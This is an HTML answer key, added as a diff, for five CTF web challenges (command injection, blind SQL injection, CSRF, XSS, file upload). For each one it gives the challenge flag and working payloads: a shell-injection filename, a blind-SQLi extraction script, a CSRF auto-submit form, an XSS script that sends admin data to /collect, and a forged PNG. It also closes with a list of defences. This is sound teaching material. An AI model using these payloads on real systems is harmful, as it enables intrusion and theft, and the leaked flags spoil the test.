@@ -1,0 +1,547 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>CAUtion CTF A-team 5문제 정답지</title>
+  <style>
+    :root {
+      color-scheme: light;
+      --bg: #f4f6f8;
+      --ink: #17202a;
+      --muted: #667085;
+      --panel: #ffffff;
+      --line: #d9e2ec;
+      --soft: #f8fafc;
+      --accent: #0f766e;
+      --accent-2: #b45309;
+      --danger: #b42318;
+      --code: #111827;
+      --code-ink: #e5edf8;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--ink);
+      font-family: Arial, "Noto Sans KR", sans-serif;
+      line-height: 1.65;
+      word-break: keep-all;
+    }
+
+    header {
+      background: #182230;
+      color: #ffffff;
+      padding: 42px 20px 36px;
+    }
+
+    .wrap {
+      width: min(1120px, calc(100% - 32px));
+      margin: 0 auto;
+    }
+
+    h1 {
+      margin: 0 0 10px;
+      font-size: clamp(28px, 4vw, 42px);
+      letter-spacing: 0;
+      line-height: 1.2;
+    }
+
+    .subtitle {
+      margin: 0;
+      color: #cbd5e1;
+      font-size: 16px;
+    }
+
+    nav {
+      background: #ffffff;
+      border-bottom: 1px solid var(--line);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    nav .wrap {
+      display: flex;
+      gap: 8px;
+      overflow-x: auto;
+      padding: 10px 16px;
+    }
+
+    nav a {
+      flex: 0 0 auto;
+      border: 1px solid var(--line);
+      border-radius: 999px;
+      color: #344054;
+      padding: 7px 12px;
+      text-decoration: none;
+      font-size: 14px;
+      background: var(--soft);
+    }
+
+    main {
+      padding: 28px 0 54px;
+    }
+
+    section {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      margin: 18px 0;
+      padding: 24px;
+    }
+
+    h2 {
+      margin: 0 0 14px;
+      color: #15384a;
+      font-size: 25px;
+      line-height: 1.3;
+      letter-spacing: 0;
+    }
+
+    h3 {
+      margin: 24px 0 8px;
+      color: var(--accent);
+      font-size: 17px;
+      letter-spacing: 0;
+    }
+
+    p {
+      margin: 8px 0;
+    }
+
+    ul,
+    ol {
+      padding-left: 22px;
+    }
+
+    li {
+      margin: 7px 0;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 14px 0;
+      overflow: hidden;
+      border-radius: 8px;
+    }
+
+    th,
+    td {
+      border: 1px solid var(--line);
+      padding: 11px 12px;
+      text-align: left;
+      vertical-align: top;
+    }
+
+    th {
+      background: #eef4f7;
+      width: 180px;
+    }
+
+    code {
+      background: #eef3f8;
+      border: 1px solid #d9e2ec;
+      border-radius: 5px;
+      padding: 1px 5px;
+      font-family: Consolas, "Courier New", monospace;
+      font-size: 0.94em;
+      word-break: break-all;
+    }
+
+    pre {
+      background: var(--code);
+      color: var(--code-ink);
+      border-radius: 7px;
+      overflow: auto;
+      padding: 15px;
+      white-space: pre-wrap;
+      word-break: break-word;
+      line-height: 1.55;
+    }
+
+    .summary {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 12px;
+    }
+
+    .card {
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      padding: 14px;
+      background: var(--soft);
+    }
+
+    .label {
+      display: block;
+      color: var(--muted);
+      font-size: 12px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+
+    .flag {
+      border-left: 5px solid var(--accent-2);
+      background: #fff7ed;
+      padding: 12px 14px;
+      border-radius: 6px;
+      font-weight: 700;
+      word-break: break-all;
+    }
+
+    .warn {
+      border-left: 5px solid var(--danger);
+      background: #fff4f2;
+      padding: 12px 14px;
+      border-radius: 6px;
+    }
+
+    .thought {
+      border-left: 5px solid var(--accent);
+      background: #eefaf8;
+      padding: 14px 16px;
+      border-radius: 6px;
+      margin: 14px 0;
+    }
+
+    .thought strong {
+      color: #0f5f59;
+    }
+
+    .note {
+      color: var(--muted);
+      font-size: 14px;
+    }
+
+    @media (max-width: 760px) {
+      .summary {
+        grid-template-columns: 1fr;
+      }
+
+      section {
+        padding: 18px;
+      }
+
+      th,
+      td {
+        display: block;
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="wrap">
+      <h1>CAUtion CTF A-team 5문제 정답지</h1>
+      <p class="subtitle">초보자도 따라 할 수 있도록 취약점 원리, 풀이 이유, 페이로드를 단계별로 정리했습니다.</p>
+    </div>
+  </header>
+
+  <nav>
+    <div class="wrap">
+      <a href="#summary">정답 요약</a>
+      <a href="#command">Command Injection</a>
+      <a href="#sqli">SQL Injection</a>
+      <a href="#csrf">CSRF</a>
+      <a href="#xss">XSS</a>
+      <a href="#upload">File Upload</a>
+    </div>
+  </nav>
+
+  <main class="wrap">
+    <section id="summary">
+      <h2>정답 요약</h2>
+      <p>이 정답지는 현재 레포지토리의 <code>deploy/</code> 소스 기준입니다. 실제 대회 서버에서 <code>FLAG</code> 환경 변수를 따로 넣으면 화면에 보이는 플래그 값은 아래 로컬 값과 달라질 수 있습니다.</p>
+      <div class="summary">
+        <div class="card"><span class="label">Command Injection</span><code>FLAG{command_injection_head_games}</code></div>
+        <div class="card"><span class="label">SQL Injection</span><code>FLAG{n0_substr_n0_glob_n0_like_n0_instr_m4st3r}</code></div>
+        <div class="card"><span class="label">CSRF</span><code>FLAG{4dm1n_m0n3y_yummy}</code></div>
+        <div class="card"><span class="label">XSS</span><code>FLAG{XSSCompleted!}</code></div>
+        <div class="card"><span class="label">File Upload</span><code>FLAG{i_am_shyoo}</code></div>
+      </div>
+    </section>
+
+    <section id="command">
+      <h2>1. Command Injection</h2>
+      <table>
+        <tr><th>문제 목표</th><td>파일 조회 기능을 이용해 서버의 <code>/app/flag.txt</code>를 읽습니다.</td></tr>
+        <tr><th>핵심 취약점</th><td>사용자가 입력한 파일명이 shell 명령어에 그대로 붙고, <code>subprocess.run(..., shell=True)</code>로 실행됩니다.</td></tr>
+        <tr><th>취약 코드</th><td><code>head -n 20 {report_dir}/{filename}</code></td></tr>
+      </table>
+
+      <h3>풀이 사고 흐름</h3>
+      <div class="thought">
+        <p><strong>처음에는 정상 기능부터 확인합니다.</strong> 파일명 입력칸에 <code>notice.txt</code>, <code>health.log</code>, <code>backup.log</code>를 넣어 보면 서버가 report 파일 내용을 읽어 준다는 것을 알 수 있습니다.</p>
+        <p><strong>그다음 의심할 지점은 파일명 입력입니다.</strong> 파일을 직접 고르는 UI가 아니라 사용자가 파일명을 문자열로 넣습니다. 이런 기능은 보통 path traversal, file read, command injection을 먼저 의심합니다.</p>
+        <p><strong><code>../flag.txt</code>를 시도하면 막힙니다.</strong> 상위 디렉토리 이동이 차단되므로 단순 path traversal은 의도 풀이가 아니라고 판단합니다. 이때 "파일명으로만 읽을 수 없다면, 파일명을 처리하는 명령어를 흔들 수 없을까?"로 생각을 옮깁니다.</p>
+        <p><strong>세미콜론을 떠올립니다.</strong> Linux shell에서 <code>명령1;명령2</code>는 두 명령을 순서대로 실행합니다. 파일명 뒤에 <code>;id</code> 같은 값을 붙여 보고 반응이 달라진다면 shell injection 가능성이 커집니다.</p>
+        <p><strong>결과가 바로 안 보여도 실패가 아닙니다.</strong> 이 문제는 이상한 문자가 들어간 파일명의 실행 결과를 화면에 숨깁니다. 그래서 "출력을 바로 보는 방식" 대신 "출력을 파일로 저장하고 다시 정상 조회하는 방식"을 시도해야 합니다.</p>
+      </div>
+
+      <h3>개념 이해</h3>
+      <p>서버는 원래 <code>notice.txt</code> 같은 파일명을 받아서 <code>head</code> 명령으로 앞부분만 보여주려고 합니다. 하지만 shell에서는 세미콜론 <code>;</code> 뒤에 새 명령을 이어 쓸 수 있습니다. 따라서 파일명 자리에 <code>notice.txt;다른명령</code>을 넣으면 파일 조회 뒤에 공격자가 원하는 명령이 한 번 더 실행됩니다.</p>
+      <p>문제는 공백과 <code>cat</code>, <code>..</code>을 막습니다. 공백은 shell의 <code>${IFS}</code>로 우회하고, <code>cat</code> 대신 <code>head</code>를 사용하면 됩니다.</p>
+
+      <h3>Step by Step</h3>
+      <ol>
+        <li>입력창에 아래 페이로드를 넣습니다. 이 페이로드는 플래그 파일 첫 줄을 현재 세션의 <code>reports/result.txt</code>에 저장합니다.</li>
+      </ol>
+      <pre>notice.txt;head${IFS}-n${IFS}1${IFS}/app/flag.txt&gt;reports/result.txt</pre>
+      <ol start="2">
+        <li>처음 요청에서는 플래그가 바로 보이지 않고 <code>Report inspection completed.</code>처럼 완료 메시지만 나올 수 있습니다. 안전한 파일명 정규식에 맞지 않는 입력은 결과를 화면에 바로 출력하지 않도록 만들어져 있기 때문입니다.</li>
+        <li>다시 입력창에 아래처럼 정상 파일명만 넣습니다.</li>
+      </ol>
+      <pre>result.txt</pre>
+      <ol start="4">
+        <li>서버가 방금 만들어진 <code>result.txt</code>를 정상 report 파일로 판단하고 내용을 보여줍니다.</li>
+      </ol>
+
+      <div class="flag">최종 정답: <code>FLAG{command_injection_head_games}</code></div>
+
+      <h3>왜 이렇게 하는가?</h3>
+      <p>명령 실행 결과를 직접 보여주지 않아도, 리다이렉션 <code>&gt;</code>으로 결과를 파일에 저장하는 부작용을 만들 수 있습니다. 그 뒤 정상 기능으로 저장된 파일을 읽으면 플래그를 얻을 수 있습니다.</p>
+    </section>
+
+    <section id="sqli">
+      <h2>2. SQL Injection</h2>
+      <table>
+        <tr><th>문제 목표</th><td>admin의 비밀번호를 알아내고, 그 값인 플래그를 제출합니다.</td></tr>
+        <tr><th>핵심 취약점</th><td>로그인 쿼리가 파라미터 바인딩 없이 문자열로 직접 만들어집니다.</td></tr>
+        <tr><th>취약 코드</th><td><code>SELECT * FROM user_table WHERE uid='{userid}' and upw='{userpassword}'</code></td></tr>
+      </table>
+
+      <h3>풀이 사고 흐름</h3>
+      <div class="thought">
+        <p><strong>처음에는 로그인 우회를 먼저 확인합니다.</strong> 문제 이름이 SQL Injection이고 로그인 폼만 있다면, ID나 Password에 작은따옴표 <code>'</code>를 넣어 SQL 문법이 깨지는지 확인합니다.</p>
+        <p><strong>단순 우회가 되는지 봅니다.</strong> ID 칸에 <code>admin'/*</code>, Password 칸에 아무 값이나 넣으면 뒤쪽 비밀번호 조건이 주석 처리됩니다. 로그인이 성공한다면 "입력이 SQL 문법으로 해석된다"는 사실을 확인한 것입니다.</p>
+        <p><strong>하지만 로그인 우회만으로는 끝나지 않습니다.</strong> 성공 화면은 전체 비밀번호, 즉 플래그를 제출하라고 요구합니다. 그래서 이제 목표는 "admin으로 들어가기"가 아니라 "admin의 비밀번호 문자열을 알아내기"로 바뀝니다.</p>
+        <p><strong>성공/실패 차이를 이용합니다.</strong> 화면이 비밀번호를 직접 보여주지는 않지만, 조건이 참이면 로그인 성공, 거짓이면 로그인 실패가 됩니다. 즉 참/거짓만 알려주는 blind SQL Injection으로 한 글자씩 추론할 수 있습니다.</p>
+        <p><strong>WAF 때문에 익숙한 함수는 버립니다.</strong> <code>substr</code>, <code>like</code>, <code>=</code>, 공백이 막히므로 흔한 풀이가 통하지 않습니다. 이때는 부등호 <code>&gt;</code>와 함수 <code>hex()</code>처럼 허용된 표현만 조합하는 방향으로 바꿉니다.</p>
+      </div>
+
+      <h3>개념 이해</h3>
+      <p>SQL Injection은 사용자의 입력이 SQL 문법의 일부로 해석되는 취약점입니다. 이 문제에서는 ID 입력칸에 작은따옴표 <code>'</code>를 넣어 원래 문자열을 닫고, 뒤에 조건을 추가할 수 있습니다.</p>
+      <p>다만 WAF가 공백, <code>=</code>, <code>substr</code>, <code>glob</code>, <code>like</code>, <code>instr</code> 등을 막습니다. 게다가 실제 플래그 안에도 <code>substr</code>, <code>glob</code>, <code>like</code>, <code>instr</code>가 들어 있어서 플래그 문자열을 그대로 비교하면 중간에 WAF에 걸립니다.</p>
+      <p>그래서 <code>hex(upw)</code>를 사용합니다. 비밀번호를 16진수 문자열로 바꾸면 입력값에는 숫자와 <code>A-F</code>만 들어가므로 금지어가 나타나지 않습니다.</p>
+
+      <h3>참/거짓을 확인하는 기본 페이로드</h3>
+      <p>ID 칸에 아래 값을 넣고, Password 칸에는 아무 값이나 넣습니다.</p>
+      <pre>admin'and(hex(upw)&gt;'46')/*</pre>
+      <p>실제 SQL은 대략 아래처럼 됩니다.</p>
+      <pre>SELECT * FROM user_table WHERE uid='admin'and(hex(upw)&gt;'46')/*' and upw='아무값'</pre>
+      <p><code>/*</code> 뒤는 주석 처리되므로 뒤쪽 비밀번호 검사를 무력화합니다. 조건이 참이면 로그인 성공, 거짓이면 로그인 실패가 됩니다.</p>
+
+      <h3>자동 추출 스크립트</h3>
+      <p>아래 스크립트는 로그인 성공/실패만 보고 <code>hex(upw)</code> 값을 이진 탐색으로 찾아냅니다. <code>URL</code>만 문제 서버 주소로 바꿔서 실행하면 됩니다.</p>
+      <pre>import requests
+
+URL = "http://127.0.0.1:8002/"
+
+def login_success(payload):
+    r = requests.post(URL, data={
+        "userid": payload,
+        "userpassword": "x",
+    })
+    return "로그인 성공" in r.text
+
+def length_greater(n):
+    return login_success(f"admin'and(length(hex(upw))&gt;{n})/*")
+
+def hex_greater(candidate):
+    return login_success(f"admin'and(hex(upw)&gt;'{candidate}')/*")
+
+# 1. hex 문자열 길이 찾기
+hex_len = 0
+while length_greater(hex_len):
+    hex_len += 1
+
+# 2. 같은 길이의 hex 문자열 범위에서 실제 값을 이진 탐색
+lo = 0
+hi = 16 ** hex_len - 1
+
+while lo &lt;= hi:
+    mid = (lo + hi) // 2
+    candidate = f"{mid:0{hex_len}X}"
+    if hex_greater(candidate):
+        lo = mid + 1
+    else:
+        hi = mid - 1
+
+flag_hex = f"{lo:0{hex_len}X}"
+flag = bytes.fromhex(flag_hex).decode()
+print(flag)</pre>
+
+      <h3>Step by Step</h3>
+      <ol>
+        <li>먼저 <code>length(hex(upw))&gt;숫자</code> 조건으로 플래그의 16진수 길이를 찾습니다.</li>
+        <li>길이를 알면 가능한 값의 범위가 <code>0</code>부터 <code>16^길이 - 1</code>까지로 정해집니다.</li>
+        <li><code>hex(upw)&gt;'후보값'</code> 조건을 반복해서 실제 hex 값이 후보보다 큰지 확인합니다.</li>
+        <li>이진 탐색이 끝나면 찾은 hex 값을 다시 문자열로 바꿉니다.</li>
+        <li>나온 플래그를 로그인 성공 화면의 플래그 제출 칸에 넣습니다.</li>
+      </ol>
+
+      <div class="flag">최종 정답: <code>FLAG{n0_substr_n0_glob_n0_like_n0_instr_m4st3r}</code></div>
+    </section>
+
+    <section id="csrf">
+      <h2>3. CSRF</h2>
+      <table>
+        <tr><th>문제 목표</th><td>admin 봇이 내 guest 세션으로 돈을 송금하게 만들고, 상점에서 플래그를 구매합니다.</td></tr>
+        <tr><th>핵심 취약점</th><td>CSRF 토큰이 랜덤이 아니라 <code>md5(username + remote_addr)</code>로 만들어져 예측 가능합니다.</td></tr>
+        <tr><th>관리자 토큰</th><td><code>md5("admin" + "127.0.0.1") = 7505b9c72ab4aa94b1a4ed7b207b67fb</code></td></tr>
+      </table>
+
+      <h3>풀이 사고 흐름</h3>
+      <div class="thought">
+        <p><strong>먼저 서비스의 목표를 확인합니다.</strong> guest로 로그인하면 돈이 0원이고, 상점의 플래그 가격은 <code>2,147,483,647</code>원입니다. 게임으로 돈을 벌 수 있지만 한 번에 1원이라 정상 구매는 현실적이지 않습니다.</p>
+        <p><strong>돈이 많은 계정을 찾습니다.</strong> 랭킹이나 코드 흐름을 보면 admin은 충분한 돈을 가지고 있습니다. 따라서 "내가 돈을 벌기"보다 "admin이 나에게 송금하게 만들기"가 목표가 됩니다.</p>
+        <p><strong>송금 기능의 방어 장치를 봅니다.</strong> <code>/transfer</code>는 <code>csrf_token</code>을 요구합니다. 여기서 바로 막힌 것처럼 보이지만, 토큰 생성식이 <code>md5(username + remote_addr)</code>인지 확인하면 생각이 바뀝니다.</p>
+        <p><strong>admin 봇의 접속 환경을 이용합니다.</strong> admin 봇은 내부에서 <code>127.0.0.1</code>로 접속합니다. username은 <code>admin</code>, remote address는 <code>127.0.0.1</code>이므로 admin의 CSRF 토큰을 미리 계산할 수 있습니다.</p>
+        <p><strong>마지막으로 봇이 실행할 HTML을 만듭니다.</strong> <code>/flag</code>는 내가 제출한 payload를 admin 봇에게 열게 해 줍니다. 따라서 자동 제출 form을 넣으면 admin 브라우저가 직접 송금 요청을 보내게 됩니다.</p>
+      </div>
+
+      <h3>개념 이해</h3>
+      <p>CSRF는 사용자가 의도하지 않은 요청을 사용자의 권한으로 보내게 만드는 공격입니다. 여기서는 사용자가 아니라 admin 봇을 속입니다. 내가 만든 HTML을 admin 봇이 열면, 그 페이지의 폼이 자동 제출되어 admin 권한으로 송금 요청이 나갑니다.</p>
+      <p>원래는 CSRF 토큰이 이 공격을 막아야 합니다. 하지만 이 문제의 토큰은 admin과 접속 IP만 알면 미리 계산할 수 있습니다. admin 봇은 서버 내부에서 <code>127.0.0.1</code>로 접속하므로 토큰 값도 고정됩니다.</p>
+
+      <h3>제출 페이로드</h3>
+      <p><code>/flag</code> 페이지의 payload 입력칸에 아래 HTML을 넣습니다.</p>
+      <pre>&lt;form action="/transfer" method="post"&gt;
+  &lt;input type="hidden" name="to" value="guest"&gt;
+  &lt;input type="hidden" name="amount" value="2147483647"&gt;
+  &lt;input type="hidden" name="csrf_token" value="7505b9c72ab4aa94b1a4ed7b207b67fb"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>
+
+      <h3>Step by Step</h3>
+      <ol>
+        <li><code>guest / guest</code>로 로그인합니다.</li>
+        <li><code>/flag</code> 페이지로 이동해서 위 페이로드를 제출합니다.</li>
+        <li>서버가 admin 봇을 실행하고, admin 봇은 내 페이로드가 들어간 <code>/vuln</code> 페이지를 방문합니다.</li>
+        <li>페이지 안의 폼이 자동 제출되면서 admin의 돈 <code>2,147,483,647</code>원이 내 guest 세션으로 송금됩니다.</li>
+        <li><code>/shop</code>으로 이동해 플래그를 구매합니다.</li>
+      </ol>
+
+      <div class="warn">주의: <code>/vuln</code>은 입력값을 <code>.lower()</code>로 소문자 변환합니다. 그래서 <code>document.getElementById</code>처럼 대문자가 필요한 JavaScript는 깨질 수 있습니다. 위 페이로드는 전부 소문자로 동작하도록 <code>document.forms[0].submit()</code>을 사용합니다.</div>
+      <div class="flag">최종 정답: <code>FLAG{4dm1n_m0n3y_yummy}</code></div>
+    </section>
+
+    <section id="xss">
+      <h2>4. XSS</h2>
+      <table>
+        <tr><th>문제 목표</th><td>관리자 봇의 권한으로 내부 API를 호출해 플래그가 들어 있는 민감정보를 가져옵니다.</td></tr>
+        <tr><th>핵심 취약점</th><td>관리자 티켓 페이지가 문의 내용을 <code>{{ ticket.content | safe }}</code>로 출력해 스크립트가 실행됩니다.</td></tr>
+        <tr><th>플래그 위치</th><td><code>/api/unmask?target_id=1004&amp;csrf_token=...</code> 응답의 <code>sensitive_note</code></td></tr>
+      </table>
+
+      <h3>풀이 사고 흐름</h3>
+      <div class="thought">
+        <p><strong>처음에는 입력이 어디에 저장되고 누가 보는지 확인합니다.</strong> <code>/request</code>에서 문의를 만들면 <code>/ticket/&lt;번호&gt;</code>에 저장됩니다. 그리고 <code>/report</code>를 통해 admin 봇이 내 티켓을 보게 할 수 있습니다.</p>
+        <p><strong>이 구조에서는 XSS를 의심합니다.</strong> 내가 쓴 내용이 관리자 화면에서 렌더링되고, 봇이 그 화면을 실제 브라우저로 방문합니다. 즉 내 JavaScript가 admin 권한으로 실행될 가능성이 있습니다.</p>
+        <p><strong>바로 flag를 읽을 수 있는지 찾습니다.</strong> 관리자 페이지에는 <code>/admin/audit</code>라는 내부 감사 페이지 힌트가 있고, 그 페이지 안에는 <code>csrf_token</code>이 숨겨져 있습니다. 또 주석으로 <code>/api/unmask</code> 엔드포인트가 안내됩니다.</p>
+        <p><strong>그래서 공격은 두 단계가 됩니다.</strong> 첫 번째 요청으로 <code>/admin/audit</code>를 읽어 토큰을 가져오고, 두 번째 요청으로 <code>/api/unmask?target_id=1004</code>를 호출합니다.</p>
+        <p><strong>브라우저 밖으로 결과를 빼내야 합니다.</strong> admin 봇 화면은 내가 직접 볼 수 없으므로, 가져온 값을 <code>/collect</code>로 보내고 나중에 내 브라우저에서 <code>/collect_log</code>를 확인합니다.</p>
+      </div>
+
+      <h3>개념 이해</h3>
+      <p>XSS는 내가 넣은 JavaScript가 다른 사람의 브라우저에서 실행되는 취약점입니다. 이 문제에서는 일반 사용자가 만든 문의 티켓을 admin 봇이 검토합니다. 관리자 전용 티켓 화면은 내용을 안전하게 escape하지 않고 그대로 렌더링하므로, 문의 내용에 넣은 스크립트가 admin 권한으로 실행됩니다.</p>
+      <p>관리자 API는 CSRF 토큰이 있어야 호출됩니다. 하지만 admin 봇의 브라우저에서 스크립트가 실행되므로 먼저 <code>/admin/audit</code> 페이지를 읽어 토큰을 가져온 뒤, 그 토큰으로 <code>/api/unmask</code>를 호출하면 됩니다.</p>
+
+      <h3>문의 내용에 넣을 페이로드</h3>
+      <pre>&lt;script&gt;
+fetch('/admin/audit')
+  .then(r =&gt; r.text())
+  .then(t =&gt; {
+    const d = new DOMParser().parseFromString(t, 'text/html');
+    const token = d.querySelector('#csrf_token').value;
+    return fetch('/api/unmask?target_id=1004&amp;csrf_token=' + token);
+  })
+  .then(r =&gt; r.json())
+  .then(j =&gt; fetch('/collect?data=' + encodeURIComponent(j.sensitive_note)));
+&lt;/script&gt;</pre>
+
+      <h3>Step by Step</h3>
+      <ol>
+        <li><code>/request</code>로 이동해서 새 문의를 작성합니다.</li>
+        <li>제목은 아무거나 넣고, 문의 내용에는 위 스크립트를 넣습니다.</li>
+        <li>작성 후 생성된 티켓 번호를 기억합니다. 주소가 <code>/ticket/3</code>이면 티켓 번호는 <code>3</code>입니다.</li>
+        <li><code>/report</code>로 이동해서 티켓 번호를 제출합니다. 그러면 admin 봇이 해당 티켓을 방문합니다.</li>
+        <li>스크립트가 admin 권한으로 <code>/admin/audit</code>에서 토큰을 읽고, <code>/api/unmask</code>로 플래그를 가져옵니다.</li>
+        <li><code>/collect_log</code>로 이동하면 수집된 플래그를 확인할 수 있습니다.</li>
+      </ol>
+
+      <div class="flag">최종 정답: <code>FLAG{XSSCompleted!}</code></div>
+    </section>
+
+    <section id="upload">
+      <h2>5. File Upload</h2>
+      <table>
+        <tr><th>문제 목표</th><td>업로드 기능으로 관리자 세션을 만들고, 관리자 파일 검색에서 <code>flag.txt</code>를 읽습니다.</td></tr>
+        <tr><th>핵심 취약점</th><td>업로드한 이미지 파일 안에서 JSON을 찾아 <code>session.update(data)</code>로 Flask 세션에 그대로 반영합니다.</td></tr>
+        <tr><th>검사 조건</th><td>확장자는 <code>.png</code>, <code>.jpg</code>, <code>.jpeg</code>만 허용하고, 파일 시작 부분은 PNG/JPG 매직바이트여야 합니다.</td></tr>
+      </table>
+
+      <h3>풀이 사고 흐름</h3>
+      <div class="thought">
+        <p><strong>먼저 접근 제어를 확인합니다.</strong> <code>/admin</code>에 들어가면 관리자 전용 페이지라고 막힙니다. 그래서 이 문제는 "파일 업로드로 관리자 권한을 얻는 방법"을 찾는 흐름입니다.</p>
+        <p><strong>업로드 제한을 하나씩 관찰합니다.</strong> 임의 텍스트 파일은 확장자 때문에 막히고, 이름만 <code>.png</code>로 바꾼 파일은 매직바이트 검사에서 막힙니다. 따라서 서버가 확장자뿐 아니라 파일 앞부분도 확인한다는 것을 알 수 있습니다.</p>
+        <p><strong>그런데 이미지 파싱이 아니라 JSON 추출이 있습니다.</strong> 파일 전체에서 <code>{...}</code> 부분을 찾아 JSON으로 읽고, 그 결과를 세션에 반영합니다. 여기서 "이미지처럼 보이지만 내부에 JSON이 숨어 있는 파일"을 만들면 되겠다고 생각할 수 있습니다.</p>
+        <p><strong>세션에서 바꿔야 할 값은 <code>is_admin</code>입니다.</strong> 관리자 페이지는 <code>session.get("is_admin")</code>이 참인지 확인합니다. 그러므로 업로드 파일 안의 JSON에 <code>{"is_admin": true}</code>를 넣으면 관리자 권한을 얻을 수 있습니다.</p>
+        <p><strong>마지막 목표는 파일 읽기입니다.</strong> 관리자 페이지에는 파일 검색 기능이 있으므로 권한을 얻은 뒤 <code>flag.txt</code>를 검색하면 됩니다.</p>
+      </div>
+
+      <h3>개념 이해</h3>
+      <p>서버는 파일 확장자와 파일 앞부분의 매직바이트를 검사해서 이미지처럼 보이는 파일만 통과시킵니다. 그런데 통과한 파일 전체를 텍스트로 읽은 뒤, 파일 안에 있는 첫 번째 <code>{</code>부터 마지막 <code>}</code>까지를 JSON으로 파싱합니다.</p>
+      <p>파싱된 JSON이 딕셔너리이면 세션에 그대로 합쳐집니다. 따라서 파일 안에 <code>{"is_admin": true}</code>를 넣으면 내 세션의 관리자 여부를 직접 <code>true</code>로 바꿀 수 있습니다.</p>
+
+      <h3>페이로드 파일 만들기</h3>
+      <p>터미널에서 아래 명령을 실행하면 PNG 매직바이트 뒤에 JSON이 붙은 <code>payload.png</code>가 만들어집니다.</p>
+      <pre>python3 - &lt;&lt;'PY'
+from pathlib import Path
+
+Path("payload.png").write_bytes(
+    b"\x89PNG\r\n\x1a\n" + b'{"is_admin": true}'
+)
+PY</pre>
+
+      <h3>Step by Step</h3>
+      <ol>
+        <li><code>/login</code>으로 들어가면 업로드 페이지로 이동합니다.</li>
+        <li>방금 만든 <code>payload.png</code>를 업로드합니다.</li>
+        <li>서버는 파일 앞부분이 PNG 매직바이트라서 이미지 검사에 통과시킵니다.</li>
+        <li>이후 파일 안의 JSON을 읽고 세션에 <code>is_admin: true</code>를 반영합니다.</li>
+        <li>업로드 완료 후 <code>/admin</code>으로 이동합니다.</li>
+        <li>파일 검색칸에 아래 값을 입력합니다.</li>
+      </ol>
+      <pre>flag.txt</pre>
+      <ol start="7">
+        <li>관리자 권한으로 서버의 <code>flag.txt</code>가 출력됩니다.</li>
+      </ol>
+
+      <div class="flag">최종 정답: <code>FLAG{i_am_shyoo}</code></div>
+    </section>
+
+    <section>
+      <h2>방어 관점에서 기억할 점</h2>
+      <ul>
+        <li>Command Injection: 사용자 입력을 shell 문자열에 붙이지 말고, <code>shell=False</code>와 인자 배열을 사용해야 합니다.</li>
+        <li>SQL Injection: SQL은 문자열 조합이 아니라 파라미터 바인딩으로 실행해야 합니다.</li>
+        <li>CSRF: 토큰은 예측할 수 없는 랜덤 값이어야 하며, 세션마다 달라야 합니다.</li>
+        <li>XSS: 사용자 입력은 기본적으로 escape하고, 꼭 필요한 경우에만 엄격한 HTML sanitizer를 거쳐야 합니다.</li>
+        <li>File Upload: 확장자와 매직바이트만 믿으면 안 되며, 업로드 파일 내용으로 세션이나 권한 값을 직접 바꾸면 안 됩니다.</li>
+      </ul>
+    </section>
+  </main>
+</body>
+</html>
